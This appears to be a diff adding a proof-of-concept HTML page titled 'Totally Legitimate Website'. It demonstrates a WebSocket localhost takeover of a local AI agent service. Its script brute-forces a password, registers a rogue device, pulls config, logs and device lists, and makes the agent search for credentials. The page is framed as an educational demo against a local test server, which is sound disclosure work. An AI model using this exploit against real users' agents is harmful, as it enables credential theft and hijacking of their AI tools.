@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Totally Legitimate Website</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            width: 100%;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            color: #333;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #856404;
+        }
+        .warning h3 {
+            margin-bottom: 10px;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            opacity: 0.9;
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+        .attack-log {
+            background: #1a1a2e;
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+            color: #00ff00;
+        }
+        .attack-log .error { color: #ff6b6b; }
+        .attack-log .success { color: #51cf66; }
+        .attack-log .info { color: #74c0fc; }
+        .attack-log .warning { color: #ffd43b; background: transparent; border: none; padding: 0; }
+        .attack-log .data { color: #da77f2; }
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #adb5bd;
+        }
+        .status-indicator.connecting { background: #ffd43b; animation: pulse 1s infinite; }
+        .status-indicator.connected { background: #51cf66; }
+        .status-indicator.attacking { background: #ff6b6b; animation: pulse 0.5s infinite; }
+        .status-indicator.complete { background: #da77f2; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .exfil-data {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        input {
+            padding: 12px;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            font-size: 14px;
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎭 "Free AI Assistant Tool"</h1>
+        <p class="subtitle">This innocent-looking page is actually attacking your local AI agent...</p>
+
+        <div class="card">
+            <div class="warning">
+                <h3>⚠️ Educational Demo</h3>
+                <p>This page demonstrates the OpenClaw WebSocket localhost takeover vulnerability.
+                   It shows how a malicious website can silently attack services running on localhost.</p>
+            </div>
+
+            <div class="status">
+                <div class="status-indicator" id="statusIndicator"></div>
+                <span id="statusText">Ready to start attack demo</span>
+            </div>
+
+            <div class="controls">
+                <input type="text" id="targetPort" value="9999" placeholder="Target port">
+                <input type="text" id="passwords" value="password,admin,demo123,123456" placeholder="Passwords to try">
+                <button class="button" id="startButton" onclick="startAttack()">Start Attack Demo</button>
+            </div>
+
+            <div class="attack-log" id="log"></div>
+
+            <div id="exfilSection" style="display: none;">
+                <h3 style="margin-top: 20px; margin-bottom: 10px;">📦 Exfiltrated Data</h3>
+                <div class="exfil-data" id="exfilData"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let ws = null;
+        let authenticated = false;
+        let exfiltratedData = {};
+
+        function log(message, type = '') {
+            const logEl = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            const typeClass = type ? `class="${type}"` : '';
+            logEl.innerHTML += `<div ${typeClass}>[${time}] ${escapeHtml(message)}</div>`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function setStatus(status, text) {
+            document.getElementById('statusIndicator').className = 'status-indicator ' + status;
+            document.getElementById('statusText').textContent = text;
+        }
+
+        function startAttack() {
+            const port = document.getElementById('targetPort').value;
+            const passwords = document.getElementById('passwords').value.split(',').map(p => p.trim());
+
+            document.getElementById('startButton').disabled = true;
+            document.getElementById('log').innerHTML = '';
+
+            log('🎯 Starting attack against localhost:' + port, 'info');
+            log('📋 Password list: ' + passwords.join(', '), 'info');
+            log('', '');
+
+            connectAndAttack(port, passwords);
+        }
+
+        function connectAndAttack(port, passwords) {
+            setStatus('connecting', 'Connecting to localhost...');
+            log('📡 Opening WebSocket to ws://localhost:' + port + '/ws', 'info');
+
+            try {
+                ws = new WebSocket('ws://localhost:' + port + '/ws');
+            } catch (e) {
+                log('❌ Failed to create WebSocket: ' + e.message, 'error');
+                setStatus('', 'Connection failed');
+                document.getElementById('startButton').disabled = false;
+                return;
+            }
+
+            ws.onopen = function() {
+                log('✅ WebSocket connected! Browser allowed localhost connection.', 'success');
+                log('⚠️  No origin validation - connection accepted from any website!', 'warning');
+                log('', '');
+
+                // Start brute force
+                setStatus('attacking', 'Brute-forcing password...');
+                bruteForcePassword(passwords, 0);
+            };
+
+            ws.onmessage = function(event) {
+                const response = JSON.parse(event.data);
+                handleResponse(response);
+            };
+
+            ws.onerror = function(error) {
+                log('❌ WebSocket error - is the vulnerable server running?', 'error');
+                log('   Run: cd demo/vulnerable-server && go run main.go', 'info');
+                setStatus('', 'Connection error');
+                document.getElementById('startButton').disabled = false;
+            };
+
+            ws.onclose = function() {
+                log('📴 WebSocket closed', 'info');
+                if (!authenticated) {
+                    document.getElementById('startButton').disabled = false;
+                }
+            };
+        }
+
+        let passwordIndex = 0;
+        let passwordList = [];
+        let attackStartTime = 0;
+
+        function bruteForcePassword(passwords, index) {
+            passwordList = passwords;
+            passwordIndex = index;
+            attackStartTime = Date.now();
+            tryNextPassword();
+        }
+
+        function tryNextPassword() {
+            if (passwordIndex >= passwordList.length) {
+                log('❌ All passwords exhausted. Attack failed.', 'error');
+                setStatus('', 'Attack failed');
+                document.getElementById('startButton').disabled = false;
+                return;
+            }
+
+            const password = passwordList[passwordIndex];
+            log('🔑 Trying password: ' + password, 'info');
+
+            ws.send(JSON.stringify({
+                type: 'auth',
+                payload: { password: password }
+            }));
+        }
+
+        function handleResponse(response) {
+            switch (response.type) {
+                case 'auth':
+                    if (response.success) {
+                        const elapsed = Date.now() - attackStartTime;
+                        log('', '');
+                        log('🎉 AUTHENTICATION SUCCESSFUL!', 'success');
+                        log('   Session ID: ' + response.data.sessionId, 'success');
+                        log('   Time elapsed: ' + elapsed + 'ms', 'success');
+                        log('   Attempts: ' + (passwordIndex + 1), 'success');
+                        log('', '');
+                        log('⚠️  NO RATE LIMITING - brute force completed instantly!', 'warning');
+                        log('', '');
+                        authenticated = true;
+
+                        // Register as device
+                        registerDevice();
+                    } else {
+                        passwordIndex++;
+                        // No delay - that's the vulnerability!
+                        tryNextPassword();
+                    }
+                    break;
+
+                case 'register':
+                    if (response.success) {
+                        log('📱 Device registered: ' + response.data.deviceName, 'success');
+                        log('⚠️  AUTO-APPROVED from localhost - no user confirmation!', 'warning');
+                        log('', '');
+
+                        // Start exfiltration
+                        setStatus('attacking', 'Exfiltrating data...');
+                        exfiltrateData();
+                    }
+                    break;
+
+                case 'getConfig':
+                    if (response.success) {
+                        log('📄 Configuration data exfiltrated!', 'data');
+                        exfiltratedData.config = response.data;
+                        ws.send(JSON.stringify({ type: 'getLogs' }));
+                    }
+                    break;
+
+                case 'getLogs':
+                    if (response.success) {
+                        log('📜 Log data exfiltrated!', 'data');
+                        exfiltratedData.logs = response.data;
+                        ws.send(JSON.stringify({ type: 'getDevices' }));
+                    }
+                    break;
+
+                case 'getDevices':
+                    if (response.success) {
+                        log('📱 Device list exfiltrated!', 'data');
+                        exfiltratedData.devices = response.data;
+
+                        // Execute a command
+                        ws.send(JSON.stringify({
+                            type: 'command',
+                            payload: { command: 'search', args: 'credentials' }
+                        }));
+                    }
+                    break;
+
+                case 'command':
+                    if (response.success) {
+                        log('🤖 Agent command executed!', 'data');
+                        exfiltratedData.commandResult = response.data;
+
+                        // Attack complete
+                        attackComplete();
+                    }
+                    break;
+            }
+        }
+
+        function registerDevice() {
+            log('📱 Registering as trusted device...', 'info');
+            ws.send(JSON.stringify({
+                type: 'register',
+                payload: { deviceName: 'Attacker Device (from malicious website)' }
+            }));
+        }
+
+        function exfiltrateData() {
+            log('🕵️ Starting data exfiltration...', 'info');
+            log('', '');
+            ws.send(JSON.stringify({ type: 'getConfig' }));
+        }
+
+        function attackComplete() {
+            log('', '');
+            log('═══════════════════════════════════════════', 'success');
+            log('   ATTACK COMPLETE - FULL COMPROMISE', 'success');
+            log('═══════════════════════════════════════════', 'success');
+            log('', '');
+
+            setStatus('complete', 'Attack complete - data exfiltrated');
+
+            // Display exfiltrated data
+            document.getElementById('exfilSection').style.display = 'block';
+            document.getElementById('exfilData').textContent = JSON.stringify(exfiltratedData, null, 2);
+
+            log('📦 Exfiltrated data displayed below', 'data');
+            log('', '');
+            log('In a real attack, this data would be sent to the attacker\'s server.', 'warning');
+
+            document.getElementById('startButton').disabled = false;
+        }
+    </script>
+</body>
+</html>
